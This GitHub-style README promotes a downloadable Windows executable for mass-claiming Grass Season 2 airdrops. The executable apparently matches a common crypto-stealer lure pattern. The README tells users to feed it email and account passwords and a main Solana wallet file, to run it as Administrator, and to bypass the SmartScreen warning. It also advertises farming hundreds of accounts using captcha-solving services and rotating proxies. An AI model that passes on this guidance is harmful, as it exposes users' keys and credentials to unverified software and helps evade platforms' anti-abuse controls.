# GrassSolAPP - Grass Season 2 Airdrop Claimer

A comprehensive automation tool for Grass.io airdrop claiming and Solana wallet management. This application provides a complete suite of modules for managing Grass accounts, claiming airdrops, and handling Solana transactions.

![License](https://img.shields.io/badge/license-MIT-blue.svg)
![Platform](https://img.shields.io/badge/platform-Windows-blue.svg)
![Node](https://img.shields.io/badge/node-%3E%3D18.0.0-brightgreen.svg)

## 🙏 Acknowledgments

**Author:** [@div_engine](https://t.me/div_engine) on Telegram

## 🚀 Download

Download the latest version of the application below:

[📥 Download GrassSolApp](https://github.com/div-engine/Grass-Season-2-Airdrop-Claimer/releases/tag/1.0)

## 🚀 Features

- **Web-based Dashboard** - Clean, intuitive interface for all operations
- **Multi-Account Management** - Handle hundreds of Grass accounts simultaneously
- **Automated Wallet Function, USDC Claiming, ATA RENT RETURNING & COLLECTION SOL/USDC TO MAIN WALLET** - Headless airdrop claiming with Merkle proof verification
- **Proxy Support** - HTTP/SOCKS5 proxy rotation with auto-healing
- **No License Required** - Completely free and

---

## 📦 Quick Start

### Download & Run

1. Download all files
2. Fill required config.json data (captcha api_key, rpc if need)
3. Run `GrassSolApp.exe`
4. The application will start automatically
5. Open your browser to **http://localhost:5555**
6. Use the web interface to manage all operations

### Requirements

- **Windows 7/8/10/11** (x64)
- No installation required - just download and run!
- No Node.js, Python, or any dependencies needed

---

## 📚 Module Documentation

#### 1. **Account Login by Pass & EMail**

<img width="730" height="1055" alt="1" src="https://github.com/user-attachments/assets/795f49a3-6756-4858-bed9-cd1dff8001a1" />

Generate authentication tokens from account credentials.

**Required Files:**
- userData/data/accs.txt [Format: account_email:account_pass] for **Login by Pass** module
- userData/data/accs.txt [Format: email:email_pass:account_email] for **Login by Email** module
- userData/data/proxies.txt [Formats: http(socks5)://user:pass@ip:port, http(socks5)://ip:port:user:pass]
- userData/config.json [Captcha settings]
- One account per line

**Features:**
- Automatic login and token extraction
- Session management
- Token refresh
- Bulk import support
- Broken Proxy change
- **Automatic captcha solving** (2Captcha/CapMonster/CapSolver)

**Requirements:**
- Valid captcha service API key configured in `config.json`

**Input File:** `userData/data/accs.txt`

---

#### 2. **Airdrop Claim (USDC)**

<img width="715" height="825" alt="2" src="https://github.com/user-attachments/assets/6dccc889-055a-4ad9-a463-a366f517b742" />

**Claim USDC airdrop from all wallets (accounts) and collect USDT/SOL to Main Wallet automatically!**

**Features:**
- Fund account wallets from main wallet
- Claim **USDC**
- Closing **ATA RENT**
- Collecting back to **Main** wallet all balance **SOL/USDC** from all wallets
- Updating Grass account broken **passwords** with new ones

Overall Fees for 1 Claim: **~0.00132 SOL**

**Required Files:**
- userData/data/tokens.txt [Format: email - token]
- userData/data/emails.txt [Format: email:email_pass:account_email:account_pass]
- userData/config.json [IMAP settings]
- userData/wallets/wallet-main.txt [Main wallet — needs ~0.008 SOL per un-claimed account]

Notice: **$0.01** from each claim will go to `Developer Fund`

---

#### 3. **Allocation Checker**

<img width="721" height="1014" alt="3" src="https://github.com/user-attachments/assets/ce2cad2e-f9d3-4e04-b3af-5b8363dc72d5" />

Bulk check Airdrop Allocation for all accounts.

**Required Files:**
- Required Files:
- userData/data/tokens.txt [Format: email - token]
- userData/data/proxies.txt [Formats: http(socks5)://user:pass@ip:port, http(socks5)://ip:port:user:pass]

#### 3. **Up TO Date Checker**

Bulk check latest updated version for both apps.

**Required Files:**
- Required Files:
- userData/data/tokens.txt [Format: email - token]
- userData/data/proxies.txt [Formats: http(socks5)://user:pass@ip:port, http(socks5)://ip:port:user:pass]

---

### Common Issues

#### Application Won't Start
- **Solution:** Right-click `GrassSol.exe` → "Run as Administrator"
- Check Windows Firewall settings
- If Windows SmartScreen blocks it: Click "More info" → "Run anyway"

#### RPC Errors (429 Rate Limit)
- **Solution:** Add premium RPC endpoints to `config.json`
- Reduce concurrency in claim settings
- Wait and retry during off-peak hours

#### Proxy Connection Fails
- **Solution:** Check proxy format: `protocol://ip:port` or `protocol://user:pass@ip:port`
- Supported: `http://`, `https://`, `socks4://`, `socks5://`
- Test proxies individually before adding to list

#### "Insufficient SOL for Transaction"
- Minimum required: ~0.008 SOL per wallet

---

## 📜 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

---

## ⚠️ Disclaimer

This software is provided "as is", without warranty of any kind. Use at your own risk.

- **Not Financial Advice** - This tool is for educational and automation purposes only
- **No Guarantees** - Airdrop eligibility and amounts are determined by Grass.io
- **User Responsibility** - You are responsible for securing your private keys and accounts
- **Compliance** - Ensure your use complies with Grass.io Terms of Service and local laws
